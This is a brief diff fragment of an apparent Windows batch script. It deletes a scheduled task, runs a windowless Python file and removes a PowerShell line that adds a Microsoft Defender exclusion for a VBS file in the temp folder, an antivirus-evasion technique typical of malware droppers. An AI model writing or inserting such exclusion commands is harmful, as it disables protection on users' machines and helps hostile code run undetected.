@@ -4,7 +4,7 @@ schtasks /delete /tn "RunPowerShellScript" /f
 py a.pyw
 
 cd %temp%
-powershell -Command "Add-MpPreference -ExclusionPath '%temp%\d.vbs'"
+
 
 
 
